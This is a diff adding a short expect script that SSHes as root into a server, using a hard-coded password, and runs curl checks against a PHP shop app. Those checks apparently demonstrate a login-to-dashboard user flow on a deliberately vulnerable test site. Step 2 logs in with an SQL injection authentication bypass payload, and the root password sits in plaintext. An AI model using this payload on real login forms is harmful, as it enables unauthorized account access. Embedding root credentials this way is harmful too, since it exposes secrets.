@@ -1,0 +1,66 @@
+#!/usr/bin/expect -f
+
+set timeout 30
+set password {$$R00tbeer02}
+
+spawn ssh root@155.138.197.128
+
+expect {
+    "password:" {
+        send "$password\r"
+    }
+    "yes/no" {
+        send "yes\r"
+        expect "password:"
+        send "$password\r"
+    }
+}
+
+expect "# "
+
+send "echo '=== USER FLOW DEMONSTRATION ==='\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '1. LOGIN PAGE - No profile link (user not logged in):'\r"
+expect "# "
+
+send "curl -s http://localhost/login.php | grep -o 'Sign in to place your order'\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '2. USER LOGS IN (SQL injection):'\r"
+expect "# "
+
+send "curl -s -L -c /tmp/flow.txt -X POST http://localhost/login.php -d \"username=admin' -- &password=x\" | grep -o 'Place Your Order' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '3. NOW ON ORDER PAGE - Profile link appears:'\r"
+expect "# "
+
+send "curl -s -b /tmp/flow.txt http://localhost/order.php | grep -o 'My Profile'\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '4. USER INFO shown on order page:'\r"
+expect "# "
+
+send "curl -s -b /tmp/flow.txt http://localhost/order.php | grep -o 'Shopping as: Walter Administrator'\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '5. PROFILE LINK goes to dashboard:'\r"
+expect "# "
+
+send "curl -s -b /tmp/flow.txt http://localhost/dashboard.php | grep -o 'Account Information' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo 'SUMMARY: Login (no profile) -> Order page (HAS profile link) -> Dashboard'\r"
+expect "# "
+
+send "exit\r"
+expect eof
+
+puts "\nThe profile link only appears AFTER login, on the order page!"
